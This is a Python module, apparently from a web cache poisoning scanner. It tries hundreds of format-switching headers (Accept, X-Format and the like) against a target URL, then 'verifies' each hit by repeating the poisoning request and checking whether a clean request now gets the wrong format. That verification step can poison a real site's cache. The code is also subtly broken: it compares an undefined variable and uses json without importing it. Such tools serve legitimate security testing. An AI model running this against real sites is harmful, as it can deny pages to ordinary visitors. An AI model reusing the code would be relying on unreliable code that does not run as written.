#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
change format poisoning (html to json/xml)
https://cpdos.org/
"""

import utils.proxy as proxy
from modules.lists import payloads_keys
from utils.style import Identify, Colors
from utils.utils import (
    configure_logger,
    human_time,
    random,
    requests,
    sys,
    re,
    range_exclusion,
    random_ua,
)
from utils.print_utils import print_results, cache_tag_verify


logger = configure_logger(__name__)


cfp_payloads = [
    {"Accept":"application/json"},
    {"Accept":"application/xml"},
    {"Accept":"text/xml"},
    {"Accept":"application/pdf"},
    {"Accept":"text/plain"},
    {"Accept":"application/xhtml+xml"},
    {"Accept":"application/rss+xml"},
    {"Accept":"application/atom+xml"},
    {"Accept":"text/csv"},
    {"Accept":"application/vnd.ms-excel"},
    {"Accept":"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"},
    {"Accept":"application/msword"},
    {"Accept":"application/vnd.openxmlformats-officedocument.wordprocessingml.document"},
    {"Accept":"application/yaml"},
    {"Accept":"text/yaml"},
    {"Accept":"application/x-yaml"},
    {"Accept":"application/octet-stream"},
    {"Accept":"application/javascript"},
    {"Accept":"text/javascript"},
    {"Accept":"application/ld+json"},
    {"Accept":"application/x-ndjson"},
    {"Accept":"application/vnd.api+json"},
    {"Accept":"application/hal+json"},
    {"Accept":"application/problem+json"},
    {"Accept":"application/graphql+json"},
    {"Accept":"application/rtf"},
    {"Accept":"text/rtf"},
    {"Accept":"application/zip"},
    {"Accept":"application/x-tar"},
    {"Accept":"application/gzip"},
    {"Accept":"application/x-bzip2"},
    {"Accept":"application/x-7z-compressed"},
    {"Accept":"application/vnd.rar"},
    {"Accept":"image/png"},
    {"Accept":"image/jpeg"},
    {"Accept":"image/gif"},
    {"Accept":"image/webp"},
    {"Accept":"image/svg+xml"},
    {"Accept":"image/bmp"},
    {"Accept":"image/tiff"},
    {"Accept":"audio/mpeg"},
    {"Accept":"audio/ogg"},
    {"Accept":"audio/wav"},
    {"Accept":"audio/webm"},
    {"Accept":"video/mp4"},
    {"Accept":"video/mpeg"},
    {"Accept":"video/ogg"},
    {"Accept":"video/webm"},
    {"Accept":"application/vnd.ms-powerpoint"},
    {"Accept":"application/vnd.openxmlformats-officedocument.presentationml.presentation"},
    {"Accept":"application/vnd.oasis.opendocument.text"},
    {"Accept":"application/vnd.oasis.opendocument.spreadsheet"},
    {"Accept":"application/vnd.oasis.opendocument.presentation"},
    {"Accept":"application/x-httpd-php"},
    {"Accept":"application/x-sh"},
    {"Accept":"text/x-python"},
    {"Accept":"text/x-java-source"},
    {"Accept":"text/markdown"},
    {"Accept":"application/wasm"},
    {"Accept":"application/protobuf"},
    {"Accept":"application/msgpack"},
    {"Accept":"application/cbor"},
    {"Accept":"application/avro"},
    {"Accept":"application/x-amf"},
    {"Accept":"application/soap+xml"},
    {"Accept":"application/vnd.collection+json"},
    {"Accept":"application/vnd.github+json"},
    {"Accept":"application/vnd.api+json; version=1"},
    {"Accept":"application/ion"},
    {"Accept":"application/x-protobuf"},
    {"Accept":"application/x-msgpack"},
    {"Accept":"text/calendar"},
    {"Accept":"text/vcard"},
    {"Accept":"application/json; charset=utf-8"},
    {"Accept":"application/xml; charset=utf-8"},
    {"Accept":"*/*"},
    {"Accept":"application/json, text/plain, */*"},
    {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
    {"Content-Type":"application/json"},
    {"Content-Type":"application/xml"},
    {"Content-Type":"text/xml"},
    {"Content-Type":"text/plain"},
    {"Content-Type":"application/x-www-form-urlencoded"},
    {"Content-Type":"multipart/form-data"},
    {"X-Format":"json"},
    {"X-Format":"xml"},
    {"X-Format":"pdf"},
    {"X-Format":"csv"},
    {"X-Format":"yaml"},
    {"Format":"json"},
    {"Format":"xml"},
    {"Format":"pdf"},
    {"Format":"csv"},
    {"Format":"yaml"},
    {"X-Accept":"application/json"},
    {"X-Accept":"application/xml"},
    {"X-Response-Format":"json"},
    {"X-Response-Format":"xml"},
    {"X-Response-Format":"pdf"},
    {"Accept-Profile":"application/json"},
    {"Accept-Profile":"application/xml"},
    {"X-Requested-With":"XMLHttpRequest"},
    {"X-Data-Format":"json"},
    {"X-Data-Format":"xml"},
    {"Response-Format":"json"},
    {"Response-Format":"xml"},
    {"API-Format":"json"},
    {"API-Format":"xml"},
    {"Output-Format":"json"},
    {"Output-Format":"xml"},
    {"Accept-Encoding":"gzip"},
    {"Accept-Encoding":"deflate"},
    {"Accept-Encoding":"br"},
    {"Accept-Encoding":"compress"},
    {"Accept-Encoding":"identity"},
    {"Accept-Encoding":"*"},
    {"Accept-Language":"en-US"},
    {"Accept-Language":"fr-FR"},
    {"Accept-Language":"es-ES"},
    {"Accept-Language":"de-DE"},
    {"Accept-Charset":"utf-8"},
    {"Accept-Charset":"iso-8859-1"},
    {"Accept-Charset":"windows-1252"},
    {"X-Output":"json"},
    {"X-Output":"xml"},
    {"X-Output":"pdf"},
    {"X-Return-Format":"json"},
    {"X-Return-Format":"xml"},
    {"X-Content-Format":"json"},
    {"X-Content-Format":"xml"},
    {"X-API-Version":"v1"},
    {"X-API-Version":"v2"},
    {"X-Media-Type":"json"},
    {"X-Media-Type":"xml"},
    {"Accept-Version":"1.0"},
    {"Accept-Version":"2.0"},
    {"X-Resource-Format":"json"},
    {"X-Resource-Format":"xml"},
    {"X-Preferred-Format":"json"},
    {"X-Preferred-Format":"xml"},
    {"X-Result-Format":"json"},
    {"X-Result-Format":"xml"},
    {"X-Export-Format":"csv"},
    {"X-Export-Format":"xlsx"},
    {"X-Download-Format":"pdf"},
    {"X-Download-Format":"csv"},
    {"Response-Type":"json"},
    {"Response-Type":"xml"},
    {"Output":"json"},
    {"Output":"xml"},
    {"Type":"json"},
    {"Type":"xml"},
    {"Datatype":"json"},
    {"Datatype":"xml"},
        {"Accept":"application/jsonlines"},
    {"Accept":"text/jsonlines"},
    {"Accept":"application/x-jsonlines"},
    {"Accept":"application/vnd.apache.parquet"},
    {"Accept":"application/x-parquet"},
    {"Accept":"application/vnd.apache.avro"},
    {"Accept":"application/x-avro-binary"},
    {"Accept":"application/vnd.openxmlformats-officedocument.spreadsheetml.template"},
    {"Accept":"application/vnd.ms-excel.sheet.macroEnabled.12"},
    {"Accept":"application/vnd.ms-excel.template.macroEnabled.12"},
    {"Accept":"application/x-sqlite3"},
    {"Accept":"application/sql"},
    {"Accept":"text/x-sql"},
    {"Accept":"application/x-ndjson"},
    {"Accept":"application/jsonl"},
    {"Accept":"application/x-ldjson"},
    {"Accept":"application/stream+json"},
    {"Accept":"application/x-bibtex"},
    {"Accept":"application/x-latex"},
    {"Accept":"text/x-tex"},
    {"Accept":"application/postscript"},
    {"Accept":"application/eps"},
    {"Accept":"image/x-eps"},
    {"Accept":"application/x-dvi"},
    {"Accept":"application/smil+xml"},
    {"Accept":"application/mathml+xml"},
    {"Accept":"application/xslt+xml"},
    {"Accept":"application/voicexml+xml"},
    {"Accept":"application/rdf+xml"},
    {"Accept":"application/sparql-results+xml"},
    {"Accept":"application/sparql-results+json"},
    {"Accept":"text/turtle"},
    {"Accept":"text/n3"},
    {"Accept":"application/n-triples"},
    {"Accept":"application/n-quads"},
    {"Accept":"application/trig"},
    {"Accept":"application/x-turtle"},
    {"Accept":"application/x-trig"},
    {"Accept":"application/ld+json; profile=\"https://www.w3.org/ns/activitystreams\""},
    {"Accept":"application/activity+json"},
    {"Accept":"application/manifest+json"},
    {"Accept":"application/vnd.geo+json"},
    {"Accept":"application/geo+json"},
    {"Accept":"application/vnd.google-earth.kml+xml"},
    {"Accept":"application/vnd.google-earth.kmz"},
    {"Accept":"application/gpx+xml"},
    {"Accept":"application/toml"},
    {"Accept":"text/toml"},
    {"Accept":"application/x-toml"},
    {"Accept":"application/ini"},
    {"Accept":"text/x-ini"},
    {"Accept":"application/x-ini"},
    {"Accept":"application/properties"},
    {"Accept":"text/x-properties"},
    {"Accept":"application/x-java-properties"},
    {"Accept":"application/xliff+xml"},
    {"Accept":"application/x-gettext-translation"},
    {"Accept":"text/x-po"},
    {"Accept":"application/x-bittorrent"},
    {"Accept":"application/x-chess-pgn"},
    {"Accept":"application/x-chess-fen"},
    {"Accept":"application/x-research-info-systems"},
    {"Accept":"application/x-endnote-refer"},
    {"Accept":"application/marc"},
    {"Accept":"application/marcxml+xml"},
    {"Accept":"application/mods+xml"},
    {"Accept":"application/mets+xml"},
    {"Accept":"application/tei+xml"},
    {"Accept":"application/jats+xml"},
    {"Accept":"application/docbook+xml"},
    {"Accept":"application/x-dtbncx+xml"},
    {"Accept":"application/epub+zip"},
    {"Accept":"application/x-mobipocket-ebook"},
    {"Accept":"application/vnd.amazon.ebook"},
    {"Accept":"application/x-ibooks+zip"},
    {"Accept":"application/x-sony-bbeb"},
    {"Accept":"application/vnd.openxmlformats-officedocument.presentationml.template"},
    {"Accept":"application/vnd.ms-powerpoint.template.macroEnabled.12"},
    {"Accept":"application/vnd.ms-powerpoint.slideshow.macroEnabled.12"},
    {"Accept":"application/vnd.openxmlformats-officedocument.wordprocessingml.template"},
    {"Accept":"application/vnd.ms-word.document.macroEnabled.12"},
    {"Accept":"application/vnd.ms-word.template.macroEnabled.12"},
    {"Accept":"application/vnd.visio"},
    {"Accept":"application/vnd.ms-project"},
    {"Accept":"application/x-iwork-pages-sffpages"},
    {"Accept":"application/x-iwork-numbers-sffnumbers"},
    {"Accept":"application/x-iwork-keynote-sffkey"},
    {"Accept":"application/x-abiword"},
    {"Accept":"application/x-gnumeric"},
    {"Accept":"application/x-kpresenter"},
    {"Accept":"application/x-kword"},
    {"Accept":"application/x-kspread"},
    {"Accept":"application/vnd.stardivision.writer"},
    {"Accept":"application/vnd.stardivision.calc"},
    {"Accept":"application/vnd.stardivision.impress"},
    {"Accept":"application/vnd.sun.xml.writer"},
    {"Accept":"application/vnd.sun.xml.calc"},
    {"Accept":"application/vnd.sun.xml.impress"},
    {"Accept":"application/vnd.corel-draw"},
    {"Accept":"application/vnd.wordperfect"},
    {"Accept":"application/vnd.lotus-1-2-3"},
    {"Accept":"application/vnd.lotus-wordpro"},
    {"Accept":"application/vnd.framemaker"},
    {"Accept":"application/x-tex-tfm"},
    {"Accept":"application/x-texinfo"},
    {"Accept":"application/x-dvi"},
    {"Accept":"application/x-font-ttf"},
    {"Accept":"application/x-font-woff"},
    {"Accept":"application/font-woff"},
    {"Accept":"application/font-woff2"},
    {"Accept":"application/vnd.ms-fontobject"},
    {"Accept":"application/x-font-otf"},
    {"Accept":"application/x-font-type1"},
    {"X-Format":"jsonlines"},
    {"X-Format":"ndjson"},
    {"X-Format":"parquet"},
    {"X-Format":"avro"},
    {"X-Format":"sqlite"},
    {"X-Format":"sql"},
    {"X-Format":"toml"},
    {"X-Format":"ini"},
    {"X-Format":"properties"},
    {"X-Format":"rdf"},
    {"X-Format":"turtle"},
    {"X-Format":"n3"},
    {"X-Format":"ntriples"},
    {"X-Format":"jsonld"},
    {"X-Format":"geojson"},
    {"X-Format":"kml"},
    {"X-Format":"gpx"},
    {"X-Format":"bibtex"},
    {"X-Format":"latex"},
    {"X-Format":"tex"},
    {"X-Format":"epub"},
    {"X-Format":"mobi"},
    {"X-Format":"docx"},
    {"X-Format":"xlsx"},
    {"X-Format":"pptx"},
    {"X-Format":"odt"},
    {"X-Format":"ods"},
    {"X-Format":"odp"},
    {"X-Format":"woff"},
    {"X-Format":"ttf"},
    {"X-Format":"otf"},
    {"Format":"jsonlines"},
    {"Format":"ndjson"},
    {"Format":"parquet"},
    {"Format":"avro"},
    {"Format":"sql"},
    {"Format":"toml"},
    {"Format":"ini"},
    {"Format":"rdf"},
    {"Format":"geojson"},
    {"Format":"kml"},
    {"Format":"latex"},
    {"Format":"epub"},
    {"Content-Type":"application/jsonlines"},
    {"Content-Type":"text/jsonlines"},
    {"Content-Type":"application/toml"},
    {"Content-Type":"application/sql"},
    {"Content-Type":"application/x-sqlite3"},
    {"Content-Type":"application/rdf+xml"},
    {"Content-Type":"text/turtle"},
    {"Content-Type":"application/ld+json"},
    {"Content-Type":"application/geo+json"},
    {"Content-Type":"application/gpx+xml"},
    {"X-Accept":"application/jsonlines"},
    {"X-Accept":"application/parquet"},
    {"X-Accept":"application/avro"},
    {"X-Accept":"application/sql"},
    {"X-Accept":"application/toml"},
    {"X-Accept":"text/csv"},
    {"X-Accept":"application/rdf+xml"},
    {"X-Accept":"application/geo+json"},
    {"X-Response-Format":"jsonlines"},
    {"X-Response-Format":"ndjson"},
    {"X-Response-Format":"parquet"},
    {"X-Response-Format":"sql"},
    {"X-Response-Format":"toml"},
    {"X-Response-Format":"rdf"},
    {"X-Response-Format":"geojson"},
    {"X-Response-Format":"latex"},
    {"X-Output":"jsonlines"},
    {"X-Output":"ndjson"},
    {"X-Output":"parquet"},
    {"X-Output":"avro"},
    {"X-Output":"sql"},
    {"X-Output":"toml"},
    {"X-Output":"rdf"},
    {"X-Output":"latex"},
    {"X-Output":"epub"},
    {"X-Return-Format":"jsonlines"},
    {"X-Return-Format":"parquet"},
    {"X-Return-Format":"sql"},
    {"X-Return-Format":"toml"},
    {"X-Return-Format":"rdf"},
    {"X-Content-Format":"jsonlines"},
    {"X-Content-Format":"parquet"},
    {"X-Content-Format":"sql"},
    {"X-Content-Format":"toml"},
    {"X-Media-Type":"jsonlines"},
    {"X-Media-Type":"parquet"},
    {"X-Media-Type":"sql"},
    {"X-Media-Type":"toml"},
    {"X-Resource-Format":"jsonlines"},
    {"X-Resource-Format":"parquet"},
    {"X-Resource-Format":"sql"},
    {"X-Preferred-Format":"jsonlines"},
    {"X-Preferred-Format":"parquet"},
    {"X-Preferred-Format":"sql"},
    {"X-Result-Format":"jsonlines"},
    {"X-Result-Format":"parquet"},
    {"X-Result-Format":"sql"},
    {"X-Export-Format":"jsonlines"},
    {"X-Export-Format":"ndjson"},
    {"X-Export-Format":"parquet"},
    {"X-Export-Format":"sql"},
    {"X-Export-Format":"toml"},
    {"X-Export-Format":"bibtex"},
    {"X-Export-Format":"latex"},
    {"X-Download-Format":"jsonlines"},
    {"X-Download-Format":"parquet"},
    {"X-Download-Format":"sql"},
    {"X-Download-Format":"toml"},
    {"X-Download-Format":"epub"},
    {"X-Download-Format":"mobi"},
    {"X-Download-Format":"docx"},
    {"X-Download-Format":"odt"},
    {"Response-Type":"jsonlines"},
    {"Response-Type":"parquet"},
    {"Response-Type":"sql"},
    {"Response-Type":"toml"},
    {"Output":"jsonlines"},
    {"Output":"parquet"},
    {"Output":"sql"},
    {"Output":"toml"},
    {"Type":"jsonlines"},
    {"Type":"parquet"},
    {"Type":"sql"},
    {"Type":"toml"},
    {"Datatype":"jsonlines"},
    {"Datatype":"parquet"},
    {"Datatype":"sql"},
    {"Datatype":"toml"},
    {"Accept-Profile":"application/parquet"},
    {"Accept-Profile":"application/avro"},
    {"Accept-Profile":"application/sql"},
    {"X-Data-Format":"jsonlines"},
    {"X-Data-Format":"parquet"},
    {"X-Data-Format":"sql"},
    {"X-Data-Format":"toml"},
    {"Response-Format":"jsonlines"},
    {"Response-Format":"parquet"},
    {"Response-Format":"sql"},
    {"API-Format":"jsonlines"},
    {"API-Format":"parquet"},
    {"API-Format":"sql"},
    {"Output-Format":"jsonlines"},
    {"Output-Format":"parquet"},
    {"Output-Format":"sql"},
    {"Accept-Encoding":"application/x-protobuf"},
    {"Accept-Encoding":"application/x-msgpack"},
    {"Accept-Charset":"application/x-yaml"},
    {"X-Serialize":"protobuf"},
    {"X-Serialize":"msgpack"},
    {"X-Serialize":"cbor"},
    {"X-Serialize":"bson"},
    {"X-Serialize":"ion"},
    {"X-Serialize":"smile"},
    {"X-Encoding":"protobuf"},
    {"X-Encoding":"msgpack"},
    {"X-Encoding":"cbor"},
    {"X-Encoding":"avro"},
    {"Serialization":"protobuf"},
    {"Serialization":"msgpack"},
    {"Serialization":"cbor"},
    {"Serialization":"bson"},
    {"X-Serializer":"protobuf"},
    {"X-Serializer":"msgpack"},
    {"X-Serializer":"json"},
    {"X-Serializer":"xml"},
    {"Accept":"application/x-protobuf"},
    {"Accept":"application/protobuf"},
    {"Accept":"application/vnd.google.protobuf"},
    {"Accept":"application/x-msgpack"},
    {"Accept":"application/msgpack"},
    {"Accept":"application/vnd.msgpack"},
    {"Accept":"application/cbor"},
    {"Accept":"application/x-cbor"},
    {"Accept":"application/bson"},
    {"Accept":"application/x-bson"},
    {"Accept":"application/ion"},
    {"Accept":"application/x-ion"},
    {"Accept":"application/smile"},
    {"Accept":"application/x-smile"},
    {"Accept":"application/thrift"},
    {"Accept":"application/x-thrift"},
    {"Accept":"application/x-capnp"},
    {"Accept":"application/flatbuffers"},
    {"Accept":"application/x-flatbuffers"},
    {"Accept":"application/x-yaml"},
    {"Accept":"text/yaml"},
    {"Accept":"text/x-yaml"},
    {"Accept":"application/x-hjson"},
    {"Accept":"application/hjson"},
    {"Accept":"application/json5"},
    {"Accept":"text/json5"},
    {"Accept":"application/hocon"},
    {"Accept":"application/x-hocon"},
    {"Accept":"application/cue"},
    {"Accept":"application/x-cue"},
    {"Accept":"application/dhall"},
    {"Accept":"application/x-pkl"},
    {"Accept":"application/pkl"},
    {"Accept":"application/vnd.api+json"},
    {"Accept":"application/hal+json"},
    {"Accept":"application/vnd.siren+json"},
    {"Accept":"application/vnd.collection+json"},
    {"Accept":"application/json-patch+json"},
    {"Accept":"application/merge-patch+json"},
    {"Accept":"application/json-seq"},
    {"Accept":"application/graphql"},
    {"Accept":"application/graphql+json"},
    {"Accept":"application/graphql-response+json"},
    {"X-GraphQL-Format":"json"},
    {"X-GraphQL-Format":"cbor"},
    {"X-Requested-With":"Protobuf"},
    {"X-Requested-With":"MessagePack"},
    {"X-Response-Encoding":"protobuf"},
    {"X-Response-Encoding":"msgpack"},
    {"X-Response-Encoding":"cbor"},
    {"X-Wire-Format":"protobuf"},
    {"X-Wire-Format":"grpc"},
    {"X-Wire-Format":"thrift"},
    {"X-Transport":"protobuf"},
    {"X-Transport":"msgpack"},
    {"X-Protocol":"grpc"},
    {"X-Protocol":"grpc-web"},
    {"X-Protocol":"thrift"},
    {"Accept":"application/grpc"},
    {"Accept":"application/grpc+proto"},
    {"Accept":"application/grpc-web"},
    {"Accept":"application/grpc-web+proto"},
    {"Accept":"application/grpc-web-text"},
    {"Accept":"application/grpc-web-text+proto"},
    {"Content-Type":"application/grpc"},
    {"Content-Type":"application/grpc-web"},
    {"Accept":"application/x-hdf"},
    {"Accept":"application/x-hdf5"},
    {"Accept":"application/x-netcdf"},
    {"Accept":"application/x-fits"},
    {"Accept":"application/x-matlab-data"},
    {"Accept":"application/x-numpy"},
    {"Accept":"application/x-arrow"},
    {"Accept":"application/vnd.apache.arrow.file"},
    {"Accept":"application/vnd.apache.arrow.stream"},
    {"Accept":"application/x-feather"},
    {"Accept":"application/x-pickle"},
    {"X-Render-As":"json"},
    {"X-Render-As":"xml"},
    {"X-Render-As":"csv"},
    {"X-Render-As":"yaml"},
    {"X-View":"json"},
    {"X-View":"xml"},
    {"X-View":"raw"},
    {"X-View":"source"},
    {"X-Transform":"json"},
    {"X-Transform":"xml"},
    {"X-Transform":"yaml"},
    {"X-Convert-To":"json"},
    {"X-Convert-To":"xml"},
    {"X-Convert-To":"csv"},
    {"X-Representation":"json"},
    {"X-Representation":"xml"},
    {"X-Representation":"binary"},
    {"Prefer":"return=representation"},
    {"Prefer":"respond-async"},
    {"Prefer":"return=minimal"},
    {"X-Pretty":"true"},
    {"X-Pretty-Print":"true"},
    {"X-Indent":"true"},
    {"Accept":"application/atom+xml"},
    {"Accept":"application/rss+xml"},
    {"Accept":"application/feed+json"},
    {"Accept":"application/json-feed"},
    {"Accept":"application/x-msgpack+gzip"},
    {"Accept":"application/x-protobuf+snappy"},
    {"Accept":"application/x-protobuf+lz4"},
    ]


def detect_format(content, headers):
    content_type = headers.get('Content-Type', '').lower()

    magic_bytes = {
        'PDF': b'%PDF-',
        'ZIP': b'PK\x03\x04',
        'PNG': b'\x89PNG',
        'JPEG': b'\xff\xd8\xff',
        'GIF': b'GIF8',
        'WEBP': b'RIFF'
    }
    
    for fmt, magic in magic_bytes.items():
        if content.startswith(magic):
            return fmt
    
    content_stripped = content.strip()
    
    
    # JSON - strict
    if 'application/json' in content_type or 'application/ld+json' in content_type:
        return 'JSON'
    
    if content_stripped.startswith(b'{') or content_stripped.startswith(b'['):
        try:
            json.loads(content)
            return 'JSON'
        except:
            pass
    
    # XML - TRÈS strict maintenant
    if 'application/xml' in content_type or 'text/xml' in content_type:
        # Vérifier que c'est vraiment du XML et pas du HTML mal étiqueté
        if b'<!DOCTYPE html' not in content[:500].lower() and b'<html' not in content[:500].lower():
            return 'XML'
    
    # XML avec déclaration explicite
    if content_stripped.startswith(b'<?xml'):
        # Double vérification : pas de tags HTML après la déclaration
        html_tags_strict = [b'<html', b'<head', b'<body', b'<title', b'<meta', b'<link', b'<script', b'<style']
        has_html_tags = any(tag in content[:2000].lower() for tag in html_tags_strict)
        if not has_html_tags:
            return 'XML'
        else:
            return False
    
    # XML sans déclaration - ULTRA strict
    if re.match(rb'^\s*<[a-zA-Z0-9_-]+[^>]*>', content[:100]):
        # Liste complète des tags HTML courants
        html_tags_complete = [
            b'<head', b'<body', b'<div', b'<span', b'<p>', b'<a ', b'<img',
            b'<script', b'<style', b'<meta', b'<title', b'<link', b'<form',
            b'<input', b'<button', b'<table', b'<tr', b'<td', b'<th',
            b'<ul', b'<ol', b'<li', b'<h1', b'<h2', b'<h3', b'<h4', b'<h5', b'<h6',
            b'<header', b'<footer', b'<nav', b'<section', b'<article', b'<aside',
            b'<main', b'<figure', b'<canvas', b'<svg', b'<video', b'<audio',
            b'<iframe', b'<embed', b'<object', b'<textarea', b'<select', b'<option',
            b'<label', b'<fieldset', b'<legend', b'<details', b'<summary'
        ]
        
        has_html = any(tag in content[:3000].lower() for tag in html_tags_complete)
        
        if not has_html:
            # Vérifier des patterns XML typiques
            xml_patterns = [
                rb'<\?xml',  # Déclaration XML
                rb'xmlns:',  # Namespace XML
                rb'<[a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+',  # Tags avec namespace (ex: soap:Envelope)
            ]
            has_xml_patterns = any(re.search(pattern, content[:1000]) for pattern in xml_patterns)
            
            # Vérifier la structure : doit avoir une racine unique
            root_tags = re.findall(rb'^<([a-zA-Z0-9_-]+)', content_stripped)
            if root_tags and len(root_tags) > 0:
                # C'est probablement du XML si :
                # 1. Pas de tags HTML
                # 2. A des patterns XML OU a une structure cohérente
                if has_xml_patterns or (not has_html and b'</' in content):
                    return 'XML'
    
    # CSV - BEAUCOUP plus strict
    if 'text/csv' in content_type or 'application/csv' in content_type:
        # Vérifier qu'il n'y a pas de HTML
        if b'<' not in content[:1000] and b'>' not in content[:1000]:
            return 'CSV'
    
    if b',' in content and b'\n' in content:
        lines = content.split(b'\n')[:10]  # Analyser les 10 premières lignes
        
        # Vérifications strictes pour CSV
        if len(lines) >= 2:  # Au moins 2 lignes
            
            # Vérifier la cohérence des colonnes
            non_empty_lines = [line for line in lines if line.strip()]
            if len(non_empty_lines) >= 2:
                # Compter les virgules dans chaque ligne
                comma_counts = [line.count(b',') for line in non_empty_lines]
                
                # Les lignes CSV doivent avoir un nombre similaire de colonnes
                if len(set(comma_counts)) <= 2:  # Max 2 variations (header peut être différent)
                    # Vérifier qu'il y a au moins 2 colonnes
                    if min(comma_counts) >= 1:
                        # Vérifier que ce n'est pas du code (JavaScript, Python, etc.)
                        code_patterns = [
                            b'function', b'var ', b'const ', b'let ', b'return',
                            b'import ', b'def ', b'class ', b'if ', b'for ', b'while '
                        ]
                        has_code = any(pattern in content[:1000].lower() for pattern in code_patterns)
                        
                        if not has_code:
                            return 'CSV'
    
    # YAML
    if 'yaml' in content_type or 'yml' in content_type:
        return 'YAML'
    
    if content_stripped.startswith(b'---'):
        # Vérifier que c'est vraiment du YAML
        lines = content_stripped.split(b'\n')[:5]
        yaml_patterns = [b':', b'- ']
        has_yaml = any(any(pattern in line for pattern in yaml_patterns) for line in lines[1:])
        if has_yaml:
            return 'YAML'
    
    # RSS/Atom (type de XML mais distinct)
    if b'<rss' in content[:200].lower() or b'xmlns="http://www.w3.org/2005/atom"' in content[:500]:
        return 'RSS/ATOM'
    
    # SOAP (type de XML mais distinct)
    if b'soap:envelope' in content[:500].lower() or b's:envelope' in content[:500].lower():
        return 'SOAP'
    
    return False


def verify_cp(s, uri, cfp, authent):
    for _ in range(5):
        req_verify = s.get(uri, headers=cfp, verify=False, auth=authent, timeout=10, allow_redirects=False)
    req_2fa_verify = s.get(uri, verify=False, auth=authent, timeout=10, allow_redirects=False)
    return detect_format(req_2fa_verify.content, req_2fa_verify.headers)


def format_poisoning(url, s, initial_response, authent, human):
    main_status_code = initial_response.status_code
    main_len = len(initial_response.content)
    blocked = 0

    df_init = detect_format(initial_response.content, initial_response.headers)
    if df != "JSON":
        rel = range_exclusion(main_len)
        for cfp in cfp_payloads:
            uri = f"{url}{random.randrange(9999)}"
            try:
                req = s.get(uri, headers=cfp, verify=False, auth=authent, timeout=10, allow_redirects=False)
                df = detect_format(req.content, req.headers)
                if df:
                    print_results(Identify.behavior , "CFP", f"HTML > {df}", cache_tag_verify(req), uri, cfp)
                    vcp = verify_cp(s, uri, cfp, authent)
                    if vcp:
                        print_results(Identify.confirmed , "CFP", f"HTML > {df}", cache_tag_verify(req), uri, cfp)
                else:
                    pass
            except UnicodeEncodeError as e:
                print(f"invalid unicode: {e}")
                logger.exception(e)
            except Exception as e:
                print(e)
                logger.exception(e)
    